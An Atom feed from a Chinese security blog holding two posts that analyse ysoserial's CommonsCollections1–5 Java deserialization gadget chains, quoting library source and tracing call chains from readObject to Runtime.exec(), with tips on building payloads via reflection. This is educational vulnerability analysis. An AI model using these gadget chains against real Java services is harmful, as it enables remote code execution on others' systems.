<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>tharavel&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.tharavel.site/"/>
  <updated>2018-05-01T17:16:55.135Z</updated>
  <id>http://www.tharavel.site/</id>
  
  <author>
    <name>tharavel</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ysoserial源码分析(3)</title>
    <link href="http://www.tharavel.site/2018/05/01/ysoserial-analysis3.html"/>
    <id>http://www.tharavel.site/2018/05/01/ysoserial-analysis3.html</id>
    <published>2018-05-01T03:57:23.201Z</published>
    <updated>2018-05-01T17:16:55.135Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CommonsCollections2分析："><a href="#CommonsCollections2分析：" class="headerlink" title="CommonsCollections2分析："></a>CommonsCollections2分析：</h3><p>CommonsCollections2和和CommonsBeanutils1一样也使用了比较器去触发TemplatesImpl的newTransformer方法执行命令。这里用到的比较器为TransformingComparator，主要利用了其compare方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object obj1, Object obj2)</span></span></div><div class="line">&#123;</div><div class="line">    Object value1 = transformer.transform(obj1);</div><div class="line">    Object value2 = transformer.transform(obj2);</div><div class="line">    <span class="keyword">return</span> decorated.compare(value1, value2);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们先看一步步看源码，首先是构造templates对象，这个以前分析过，就不再说了，可以翻找前面的文章。然后实例化了一个InvokerTransformer对象，CommonsCollections4.0中InvokerTransformer构造函数稍有一点变化，代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class paramTypes[], Object args[])</span></span></div><div class="line">&#123;</div><div class="line">    iMethodName = methodName;</div><div class="line">    iParamTypes = paramTypes == <span class="keyword">null</span> ? <span class="keyword">null</span> : (Class[])paramTypes.clone();</div><div class="line">    iArgs = args == <span class="keyword">null</span> ? <span class="keyword">null</span> : (Object[])((Object []) (args)).clone();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>接着就是将templates对象放进PriorityQueue类里，将transformer对象的iMethodName属性修改为newTransformer，这里再次强调一下，要使用反射修改变量，而不是直接赋值，不然会在生成payload时就执行命令，从而导致无法生成序列化数据。最后返回PriorityQueue对象queue。</p>
<p>反序列化过程调用链如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ObjectInputStream.readObject</div><div class="line">    PriorityQueue.readObject</div><div class="line">        PriorityQueue.heapify</div><div class="line">            PriorityQueue.siftDown</div><div class="line">                PriorityQueue.siftDownUsingComparator</div><div class="line">                    TransformingComparator.compare</div><div class="line">                        InvokerTransformer.transform()</div><div class="line">                            Method.invoke(templates,iArgs) //这里Method是之前反射修改成的newTransformer,所以这里相当于执行TemplatesImpl.newTransformer</div><div class="line">                                TemplatesImpl.getTransletInstance</div><div class="line">                                   TemplatesImpl.defineTransletClasses</div><div class="line">                                        TemplatesImpl.TransletClassLoader.defineClass</div><div class="line">                                        Class.newInstance()</div><div class="line">                                            Runtime.exec()</div></pre></td></tr></table></figure></p>
<h3 id="CommonsCollections3分析："><a href="#CommonsCollections3分析：" class="headerlink" title="CommonsCollections3分析："></a>CommonsCollections3分析：</h3><p>CommonsCollections3适用于commons-collections:3.1，CommonsCollections3与CommonsCollections1差不多，ConstantTransformer的构造略有不同。</p>
<p>这次用的是InstantiateTransformer类，而不再是InvokerTransformer类，InvokerTransformer类主要方法如下,其transform方法会对传入的class进行实例化<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    iParamTypes = paramTypes;</div><div class="line">    iArgs = args;</div><div class="line">&#125;</div><div class="line"></div><div class="line">......</div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="keyword">false</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(</div><div class="line">                <span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span></div><div class="line">                    + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</div><div class="line">        &#125;</div><div class="line">        Constructor con = ((Class) input).getConstructor(iParamTypes);</div><div class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</div><div class="line">    &#125;</div><div class="line">    ......</div></pre></td></tr></table></figure></p>
<p>还用到了一个TrAXFilter类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span></span></div><div class="line">    <span class="keyword">throws</span> TransformerConfigurationException</div><div class="line">&#123;</div><div class="line">    _templates = templates;</div><div class="line">    _transformer = (TransformerImpl)templates.newTransformer();</div><div class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</div><div class="line">    _overrideDefaultParser = _transformer.overrideDefaultParser();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>看到其中的<code>templates.newTransformer()</code>估计应该能想到整个调用方式了。</p>
<p>我们直接看反序列化调用链，LazyMap.get()方法执行后触发ChainedTransformer链，执行<code>TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)</code>，也即是<code>new TrAXFilter(templatesImpl)</code>,然后触发templates.newTransformer()从而引起了命令执行。</p>
<h3 id="CommonsCollections4分析："><a href="#CommonsCollections4分析：" class="headerlink" title="CommonsCollections4分析："></a>CommonsCollections4分析：</h3><p>commons-collections4以上的版本中已经没有Lazymap.decorate方法，所以使用了别的办法触发transformerChain链。</p>
<p>用到的类基本都是之前payload中用过的，所以下面就简单分析一下。</p>
<p>首先还是构造一个 templates对象，构造的ChainedTransformer链包含ConstantTransformer对象和InstantiateTransformer对象，后面通过反射修改ConstantTransformer的iConstant值为TrAXFilter.class，把InstantiateTransformer的paramTypes, args分别赋值为Templates.class和templates。在反序列化过程中通过PriorityQueue类触发<code>TransformingComparator.compare</code>，然后触发ChainedTransformer.transform执行<code>TrAXFilter.class.getConstructor(Templates.class).newInstance(templatesImpl)</code>从而导致命令执行</p>
<h3 id="CommonsCollections5分析："><a href="#CommonsCollections5分析：" class="headerlink" title="CommonsCollections5分析："></a>CommonsCollections5分析：</h3><p>CommonsCollections5也是适用于3.1版本，利用方式和CommonsCollections1差不多，用到了两个新类TiedMapEntry和BadAttributeValueExpException。</p>
<p>前面都一样，先构造ConstantTransformer链，然后产生lazymap对象，所以的目标还是要触发lazymap的get方法。</p>
<p>重点看一下下面的代码，把生成的lazymap对象传给TiedMapEntry类，看看这个类的关键方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">TiedMapEntry</span><span class="params">(Map map, Object key)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    <span class="keyword">this</span>.map = map;</div><div class="line">    <span class="keyword">this</span>.key = key;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>可以看到lazymap被赋值给map。接着又实例化了BadAttributeValueExpException对象val，并通过反射机制把val对象的val属性修改为TiedMapEntry类的对象enrty，最后返回val对象。</p>
<p>BadAttributeValueExpException关键函数如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span><span class="params">(Object obj)</span></span></div><div class="line">&#123;</div><div class="line">    val = obj != <span class="keyword">null</span> ? ((Object) (obj.toString())) : <span class="keyword">null</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectinputstream)</span></span></div><div class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    java.io.ObjectInputStream.GetField getfield = objectinputstream.readFields();</div><div class="line">    Object obj = getfield.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</div><div class="line">    <span class="keyword">if</span>(obj == <span class="keyword">null</span>)</div><div class="line">        val = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    <span class="keyword">if</span>(obj <span class="keyword">instanceof</span> String)</div><div class="line">        val = obj;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    <span class="keyword">if</span>(System.getSecurityManager() == <span class="keyword">null</span> || (obj <span class="keyword">instanceof</span> Long) || (obj <span class="keyword">instanceof</span> Integer) || (obj <span class="keyword">instanceof</span> Float) || (obj <span class="keyword">instanceof</span> Double) || (obj <span class="keyword">instanceof</span> Byte) || (obj <span class="keyword">instanceof</span> Short) || (obj <span class="keyword">instanceof</span> Boolean))</div><div class="line">        val = obj.toString(); <span class="comment">//执行entry.toSrting</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        val = (<span class="keyword">new</span> StringBuilder()).append(System.identityHashCode(obj)).append(<span class="string">"@"</span>).append(obj.getClass().getName()).toString();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> map.get(key);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getKey() + <span class="string">"="</span> + getValue();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们分析一下反序列化调用链：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">BadAttributeValueExpException.readObject()</div><div class="line">    TiedMapEntry.toSrting() //这里是entry对象</div><div class="line">        TiedMapEntry.getValue()</div><div class="line">            LazyMap.get()</div><div class="line">            ......</div><div class="line">            Runtime.exec()</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;CommonsCollections2分析：&quot;&gt;&lt;a href=&quot;#CommonsCollections2分析：&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections2分析：&quot;&gt;&lt;/a&gt;CommonsCollections2分
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ysoserial源码分析(2)</title>
    <link href="http://www.tharavel.site/2018/04/29/ysoserial-analysis2.html"/>
    <id>http://www.tharavel.site/2018/04/29/ysoserial-analysis2.html</id>
    <published>2018-04-29T08:05:15.191Z</published>
    <updated>2018-05-03T07:19:53.395Z</updated>
    
    <content type="html"><![CDATA[<p>这次分析CommonsCollections1…，适用commons-collections:3.1</p>
<h3 id="Gadgets-java："><a href="#Gadgets-java：" class="headerlink" title="Gadgets.java："></a>Gadgets.java：</h3><h4 id="createMemoitizedProxy函数"><a href="#createMemoitizedProxy函数" class="headerlink" title="createMemoitizedProxy函数"></a>createMemoitizedProxy函数</h4><p>还是和以前一样，先解释用到的其他文件中的函数。 该函数调用了<code>createProxy(createMemoizedInvocationHandler(map), iface, ifaces)</code>方法，先看看<code>createMemoizedInvocationHandler(map)</code>，该方法通过反射return一个InvocationHandler类的实例，并将InvocationHandler类的属性memberValues赋值为map。creatProxy函数的主要作用就是创建动态代理，首先生成了一个数组allIfaces，allIfaces第一个值是iface，即传入createMemoitizedProxy的接口对象，比如CommonsCollections1中传入的是Map接口。如果传入了ifaces值，则使用System.arraycopy方法将ifaces的内容复制到allIfaces数组后面。</p>
<p>最后，返回强制转换为map类型的map代理对象(class.cast方法的作用其实就是强制类型转换，这一点查看Class.cast源代码可以轻易看出)</p>
<h3 id="CommonsCollections1分析："><a href="#CommonsCollections1分析：" class="headerlink" title="CommonsCollections1分析："></a>CommonsCollections1分析：</h3><p>首先实例化了ChainedTransformer类，并传入Transformer[]数组，里面包含<code>ConstantTransformer(1)</code>对象。接着又定义了一个Transformer[]数组，我们看看里面的元素，第一个是传入了<code>Runtime.class</code>的ConstantTransformer对象。后面三个都是InvokerTransformer对象，最后的ConstantTransformer(1)可有可无。</p>
<p>ConstantTransformer类主要方法如下，其transform方法返回传入的常量：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        iConstant = constantToReturn;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line">     * Transforms the input by ignoring it and returning the stored constant instead.</div><div class="line">     * </div><div class="line">     * <span class="doctag">@param</span> input  the input object which is ignored</div><div class="line">     * <span class="doctag">@return</span> the stored constant</div><div class="line">     */</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> iConstant;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>InvokerTransformer类主要方法如下，接收的参数分别是方法名，参数类型和参数值，其transform方法会利用反射执行传入的方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</div><div class="line">    <span class="keyword">super</span>();</div><div class="line">    iMethodName = methodName;</div><div class="line">    iParamTypes = paramTypes;</div><div class="line">    iArgs = args;</div><div class="line">&#125;</div><div class="line">......</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        Class cls = input.getClass();</div><div class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</div><div class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>ChainedTransformer类主要方法如下，其transform方法会循环调用Transformer[]数组中存储的transformer对象的transform方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>();</div><div class="line">        iTransformers = transformers;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">......</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</div><div class="line">            object = iTransformers[i].transform(object);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> object;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>利用的关键在于InvokerTransformer类，因为它的transform方法使用了反射机制来执行传入的方法，我们可用通过这一点让其反射执行Runtime.getRuntime().exec()。ysoserial的代码中就构造了一个transform数组，将Runtime.getRuntime().exec(cmd)分解成几部分，第一部分为Runtime.class，保存在ConstantTransformer对象中，第二部分为getMethod,第三部分为invoke,第四部分为exec，后面三部分都保存在InvokerTransformer对象。怎么将这些transform类串起来执行呢，这就用到了ChainedTransformer的transform方法。</p>
<p>如果我们把之前构造的数组作为ChainedTransformer的参数，再执行ChainedTransformer对象的transform方法，那么transform数组中所有的transform类的transform方法都会被依次执行，并且前一个数组元素执行的结果会作为参数传给下一个数组元素:<code>object = iTransformers[i].transform(object);</code></p>
<p>我们分析一下调用链:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Runtime.class</div><div class="line">Runtime.class.getMethod(&quot;getRuntime&quot;)</div><div class="line">Runtime.class.getMethod(&quot;getRuntime&quot;).invoke()</div><div class="line">Runtime.class.getMethod(&quot;getRuntime&quot;).invoke().exec(cmd)</div></pre></td></tr></table></figure></p>
<p>通过该调用链，可以成功执行命令。所以只要我们能够触发 ChainedTransformer 对象的 transform() 方法，就可造成命令执行。如何触发该方法呢，这里利用了LazyMap类，LazyMap有个 get 方法，源码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">    <span class="comment">// create value for key if key is not currently in the map</span></div><div class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="keyword">false</span>) &#123;</div><div class="line">        Object value = factory.transform(key);</div><div class="line">        map.put(key, value);</div><div class="line">        <span class="keyword">return</span> value;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> map.get(key);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>我们看到，该方法里面调用了transform方法，如果factory为一个构造好的ChainedTransformer，即可执行exec()。那如何触发get方法呢，这就是后面一部分代码的作用。</p>
<p>先是产生一个HashMap对象<code>innerMap</code>，然后调用了LazyMap.decorate(innerMap, transformerChain)方法，跟进该方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LazyMap(map, factory);</div><div class="line">    &#125;</div><div class="line">......</div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(map);</div><div class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">this</span>.factory = factory;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>在这里，我们已经成功把transformerChain赋值给了factory,只差执行get方法了(在CommonCollection4中已经删除了decorate方法)。</p>
<p>对于get方法的执行，实际上是利用了AnnotationInvocationHandler类，该类实现了InvocationHandler接口，可以代理其他对象。我们知道，被代理的对象进行方法调用时，会执行代理类的invoke()方法。而在AnnotationInvocationHandler类的invoke()方法中，存在对其memberValues的get()调用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Method method, Object aobj[])</span></span></div><div class="line">&#123;</div><div class="line">    String s = method.getName();</div><div class="line">    Class aclass[] = method.getParameterTypes();</div><div class="line">    <span class="keyword">if</span>(s.equals(<span class="string">"equals"</span>) &amp;&amp; aclass.length == <span class="number">1</span> &amp;&amp; aclass[<span class="number">0</span>] == java/lang/Object)</div><div class="line">        <span class="keyword">return</span> equalsImpl(aobj[<span class="number">0</span>]);</div><div class="line">    <span class="keyword">if</span>(aclass.length != <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Too many parameters for an annotation method"</span>);</div><div class="line">    Object obj1 = s;</div><div class="line">    <span class="keyword">byte</span> byte0 = -<span class="number">1</span>;</div><div class="line">    </div><div class="line">    ......</div><div class="line">    </div><div class="line">    obj1 = memberValues.get(s); <span class="comment">//这里存在对其memberValues执行get方法</span></div><div class="line">    <span class="keyword">if</span>(obj1 == <span class="keyword">null</span>)</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(type, s);</div><div class="line">    <span class="keyword">if</span>(obj1 <span class="keyword">instanceof</span> ExceptionProxy)</div><div class="line">        <span class="keyword">throw</span> ((ExceptionProxy)obj1).generateException();</div><div class="line">    <span class="keyword">if</span>(obj1.getClass().isArray() &amp;&amp; Array.getLength(obj1) != <span class="number">0</span>)</div><div class="line">        obj1 = cloneArray(obj1);</div><div class="line">    <span class="keyword">return</span> obj1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>源码继续往下分析，调用了<code>Gadgets.createMemoitizedProxy(lazyMap, Map.class)</code>，返回值是lazyMap被动态代理后的对象,并且InvocationHandler类的属性memberValues赋值为Lazymap对象。接着又将该对象传递到Gadgets.createMemoizedInvocationHandler方法中，返回的新的AnnotationInvocationHandler对象的memberValue的值为LazyMap的代理对象。（至于为什么要再次封装到AnnotationInvocationHandler里，下文有解释）</p>
<p>最后，通过反射修改transformerChain对象的属性<code>iTransformers</code>值为transformers,然后返回handler。</p>
<p>下面再分析一下反序列过程，看看payload如何触发执行的。</p>
<p>老版本的AnnotationInvocationHandler的readObject()方法代码如下：  </p>
<p><img src="http://op5cjcnmi.bkt.clouddn.com/picture/180429/3EfJiH2m8E.png" alt=""></p>
<p>现在的AnnotationInvocationHandler的readObject()函数源码如下()：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectinputstream)</span></span></div><div class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    java.io.ObjectInputStream.GetField getfield = objectinputstream.readFields();</div><div class="line">    Class class1 = (Class)getfield.get(<span class="string">"type"</span>, <span class="keyword">null</span>);</div><div class="line">    Map map = (Map)getfield.get(<span class="string">"memberValues"</span>, <span class="keyword">null</span>);</div><div class="line">    AnnotationType annotationtype = <span class="keyword">null</span>;</div><div class="line">    <span class="keyword">try</span></div><div class="line">    &#123;</div><div class="line">        annotationtype = AnnotationType.getInstance(class1);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span>(IllegalArgumentException illegalargumentexception)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</div><div class="line">    &#125;</div><div class="line">    Map map1 = annotationtype.memberTypes();</div><div class="line">    LinkedHashMap linkedhashmap = <span class="keyword">new</span> LinkedHashMap();</div><div class="line">    String s;</div><div class="line">    Object obj;</div><div class="line">    <span class="keyword">for</span>(Iterator iterator = map.entrySet().iterator(); iterator.hasNext(); linkedhashmap.put(s, obj))</div><div class="line">    &#123;</div><div class="line">        java.util.Map.Entry entry = (java.util.Map.Entry)iterator.next();</div><div class="line">        s = (String)entry.getKey();</div><div class="line">        obj = <span class="keyword">null</span>;</div><div class="line">        Class class2 = (Class)map1.get(s);</div><div class="line">        <span class="keyword">if</span>(class2 == <span class="keyword">null</span>)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        obj = entry.getValue();</div><div class="line">        <span class="keyword">if</span>(!class2.isInstance(obj) &amp;&amp; !(obj <span class="keyword">instanceof</span> ExceptionProxy))</div><div class="line">            obj = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy((<span class="keyword">new</span> StringBuilder()).append(obj.getClass()).append(<span class="string">"["</span>).append(obj).append(<span class="string">"]"</span>).toString())).setMember((Method)annotationtype.members().get(s));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    UnsafeAccessor.setType(<span class="keyword">this</span>, class1);</div><div class="line">    UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, linkedhashmap);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>无论新老版本的代码，AnnotationInvocationHandler的readObject()函数中都对memberValues的调用了entrySet()函数。我们知道memberValues的值是LazyMap的代理对象，当代理对象调用任意方法时，实质是通过其AnnotationInvocationHandler的invoke方法执行，而invoke方法中又存在<code>memberValues.get(s)</code>，这里的memberValues是Lazymap对象，如此一来，顺利执行了LazyMap.get()方法。</p>
<p>整理一下，整个过程的调用链如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">AnnotationInvocationHandler.readObject() <span class="comment">// handler</span></div><div class="line">    AnnotationInvocationHandler.memberValues.entrySet() <span class="comment">// memberValues值为LazyMap代理对象</span></div><div class="line">        AnnotationInvocationHandler.invoke() <span class="comment">//此时的 AnnotationInvocationHandler是Gadgets.createMemoitizedProxy(lazyMap, Map.class)执行中所创建</span></div><div class="line">            AnnotationInvocationHandler.memberValues.get() <span class="comment">//memberValues值为LazyMap对象</span></div><div class="line">                ChainedTransformer.transform()</div><div class="line">                    Runtime.class.getClass().getMethod(<span class="string">"getRuntime"</span>).invoke().exec(cmd)</div></pre></td></tr></table></figure></p>
<p>对于ChainedTransformer的触发，网上还有一种payload通过TransformMap来构造，TransformMap的checkSetValue方法也能够执行transform方法从而触发ChainedTransformer链，相关文章有很多，这里也不多说了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次分析CommonsCollections1…，适用commons-collections:3.1&lt;/p&gt;
&lt;h3 id=&quot;Gadgets-java：&quot;&gt;&lt;a href=&quot;#Gadgets-java：&quot; class=&quot;headerlink&quot; title=&quot;Gadgets.
    
